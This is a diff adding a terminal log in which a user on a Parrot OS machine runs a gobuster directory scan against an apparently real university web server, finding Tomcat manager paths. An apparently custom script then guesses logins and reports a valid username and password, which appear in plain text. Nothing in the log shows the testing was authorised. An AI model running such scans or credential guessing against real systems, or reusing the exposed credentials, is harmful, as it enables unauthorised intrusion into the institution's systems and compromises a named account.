@@ -1,0 +1,43 @@
+┌─[marcos_os@parrot]─[~]
+└──╼ $gobuster dir -u https://sito.utslp.edu.mx -w /usr/share/wordlists/dirb/common.txt -k -o sito_dirs.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://sito.utslp.edu.mx
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/css/]
+/docs                 (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/docs/]
+/examples             (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/examples/]
+/fotos                (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/fotos/]
+/host-manager         (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/host-manager/]
+/images               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/images/]
+/index.html           (Status: 200) [Size: 634]
+/javascript           (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/javascript/]
+/jsp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/jsp/]
+/manager              (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/manager/]
+/styles               (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/styles/]
+/tmp                  (Status: 302) [Size: 0] [--> https://sito.utslp.edu.mx/tmp/]
+/Thumbs.db            (Status: 200) [Size: 154624]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+
+Probando: harriaga:utslp
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1053: InsecureRequestWarning: Unverified HTTPS request is being made to host 'sito.utslp.edu.mx'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings
+  warnings.warn(
+
+[¡ÉXITO!] Credenciales válidas: harriaga:utslp
+Status: 200
+
+
